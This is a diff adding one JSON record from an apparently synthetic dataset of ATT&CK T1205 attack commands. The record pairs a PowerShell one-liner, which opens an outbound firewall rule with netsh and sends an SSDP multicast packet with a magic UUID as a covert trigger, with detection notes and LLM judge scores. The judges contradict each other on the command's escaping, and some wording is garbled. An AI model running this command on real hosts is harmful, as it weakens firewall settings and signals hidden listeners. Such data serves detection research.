@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall firewall add rule name='SSDP-Signal' dir=out action=allow protocol=UDP remoteport=1900 remoteip=239.255.255.250 >$null;$u=New-Object System.Net.Sockets.UdpClient;$data='M-SEARCH * HTTP/1.1`r`nHOST: 239.255.255.250:1900`r`nST: uuid:deadbeef-dead-beef-dead-beefdeadbeef`r`nMAN: \"ssdp:discover\"`r`nMX: 1`r`n`r`n';$bytes=[Text.Encoding]::ASCII.GetBytes($data);$u.Send($bytes,$bytes.Length,'239.255.255.250',1900)|Out-Null",
+  "explanation": "Transmits a multicast SSDP M-SEARCH request with a magic UUID in the ST header, enabling remote listeners to treat it as a covert trigger. Uses netsh to allow outbound UDP/1900 to the SSDP multicast address.",
+  "rationale_steps": [
+    "Craft a SSDP discovery message embedding a unique magic token in the ST field.",
+    "Allow and send multicast UDP/1900 traffic for signaling.",
+    "Detection: monitor outbound SSDP from servers, inspect unusual ST values, and detect netsh-created rules permitting multicast on non-UM H devices."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-00bead39",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes and parentheses, valid separators, and correctly structured netsh and UdpClient calls.",
+        "semantic_score": 4,
+        "semantic_justification": "It sends a UDP datagram to the SSDP multicast address with the intended magic ST value (traffic signaling), though the CRLF escapes in a single-quoted string and lack of admin rights for the firewall rule may impede exact SSDP formatting and rule application.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T15:24:38.473678Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variables, strings, object creation, method calls, and command separation, including proper escaping for newlines in the string literal.",
+        "semantic_score": 3,
+        "semantic_justification": "While the crafted SSDP message is semantically aligned with Traffic Signaling (T1205), the initial `netsh advfirewall` command will fail due to requiring administrative privileges, contradicting the stated 'Privilege: None', which significantly impacts the command's operational feasibility and its ability to fully achieve the claimed intent of allowing outbound traffic.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:25:04.194928Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
